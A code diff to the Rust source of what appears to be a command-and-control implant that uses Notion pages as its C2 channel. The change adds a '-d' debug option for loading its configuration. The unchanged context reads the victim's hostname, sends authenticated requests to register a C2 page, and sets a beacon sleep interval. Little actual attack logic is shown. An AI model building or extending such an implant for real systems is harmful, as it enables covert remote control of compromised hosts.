@@ -15,7 +15,13 @@ use reqwest::{Client};
 use reqwest::header::{HeaderMap, AUTHORIZATION, CONTENT_TYPE};
 
 mod config;
-use config::{self as config_mod, URL_BASE, ConfigOptions, get_config_options};
+use config::{
+    self as config_mod, 
+    URL_BASE, 
+    ConfigOptions, 
+    get_config_options, 
+    get_config_options_debug
+};
 
 /// Creates a new C2 page in Notion.
 /// 
@@ -131,16 +137,31 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     
     println!("Starting!");
     
-    let config_options_handle = tokio::spawn( async {
-        return get_config_options();
-        
-    });
-    let config_options = config_options_handle.await?.unwrap();
+    // Handle config options
+    let config_options: ConfigOptions;
+
+    // Check for `-d` option
+    match args().nth(1) {
+        Some(a) => {
+            if a == "-d" {
+                // Set up async handle for debug
+                let config_options_handle = tokio::spawn( async {
+                    return get_config_options_debug();
+                });
+                config_options = config_options_handle.await?.unwrap();
+            } else {
+                config_options = get_config_options().await?;
+            }
+        },
+        None => {config_options = get_config_options().await?;}
+    }
+    
     let hn = hostname::get()
         .ok()
         .unwrap()
         .into_string()
         .unwrap();
+
     println!("{:?}", hn);
     println!("{:?}", config_options);
     let mut headers = HeaderMap::new();
@@ -152,8 +173,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .build()?;
 
     let page_id = create_page(&client, &config_options, hn)
-    .await
-    .unwrap();
+        .await
+        .unwrap();
 
     let sleep_time = 
         time::Duration::from_secs(config_options.sleep_interval);
